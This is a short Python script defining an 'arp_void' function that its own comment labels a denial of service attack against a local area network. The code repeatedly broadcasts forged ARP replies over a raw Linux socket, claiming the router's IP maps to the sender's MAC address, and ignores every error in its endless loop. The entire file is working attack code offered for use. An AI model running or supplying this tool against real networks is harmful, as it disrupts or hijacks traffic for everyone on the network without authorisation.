import binascii
import ipaddress
import socket
import sys
import time
import uuid
from sys import platform
from TheSilent.clear import clear

CYAN = "\033[1;36m"
RED = "\033[1;31m"

# denial of service attack against local area network using an arp void attack
def arp_void(router, interface):
    clear()

    mac = hex(uuid.getnode())
    og_mac = str(mac).replace("0x", "")
    mac = ":".join(mac[i:i + 2] for i in range(0, len(mac), 2))
    mac = str(mac).replace("0x:", "")

    print(CYAN + "mac address: " + mac + " | ip address: " + router + " | interface: " + str(interface))

    router = hex(int(ipaddress.IPv4Address(router)))
    router = str(router).replace("0x", "")

    while True:
        time.sleep(1)
        try:
            my_code = binascii.unhexlify(
                "ffffffffffff" +
                og_mac +
                "08060001080006040002" +
                og_mac +
                router +
                "ffffffffffff" +
                "00000000")

            if platform == "linux":
                super_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))

            else:
                print(RED + "Unsupported platform! Linux is required for this tool!")
                sys.exit()

            super_socket.bind((interface, 0))
            super_socket.sendall(my_code)
            print("packet sent")

        except:
            continue
